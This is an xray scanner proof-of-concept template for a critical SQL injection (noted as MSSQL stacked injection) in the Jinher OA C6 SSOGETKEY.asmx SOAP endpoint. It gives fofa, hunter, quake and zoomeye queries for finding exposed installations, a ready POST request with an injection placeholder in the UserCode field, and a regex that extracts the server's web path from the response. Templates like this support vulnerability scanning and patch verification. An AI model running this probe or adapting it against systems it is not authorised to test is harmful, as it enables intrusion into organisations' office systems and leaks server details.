xray-poc/xray-poc-jinhe-c6-SSOGETKEY.asmx-sqli.yml

detail:
  author: 
  links:
    - x
  vulnerability:
    level: critical
    fofa-query: app="Jinher-OA"
    hunter-query: app.name="金和 OA"
    quake-query: app:"金和OA"
    zoomeye-query: app:"金和OA"
    threatbook-query: 
    cve: 
    cnvd: 
    tips: mssql 叠堆注入

name: poc-yaml-jinhe-c6-SSOGETKEY.asmx-sqli.yml
transport: http
set:
    s1: randomInt(1000000000, 9000000000)
    s2: randomLowercase(8)
    reverse: newReverse()
    reverseURL: reverse.url
rules:
  r0:
    request:
      method: POST
      cache: true
      path: /C6/JinHerSSO/SSOGETKEY.asmx
      follow_redirects: false
      headers: 
        Content-Type: text/xml; charset=utf-8
        SOAPAction: http://tempuri.org/Authorize
      body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n<soap:Body>\r\n<Authorize xmlns=\"http://tempuri.org/\">\r\n<UserCode>*</UserCode>\r\n</Authorize>\r\n</soap:Body>\r\n</soap:Envelope>"    
    expression: >-
      response.status == 200 && response.body_string.contains("false") && response.body_string.contains("xml version")

    output:
      search: |-
        "(?P<path>.+)/webapps".bsubmatch(response.body)
      path: search["path"]

expression: r0() 
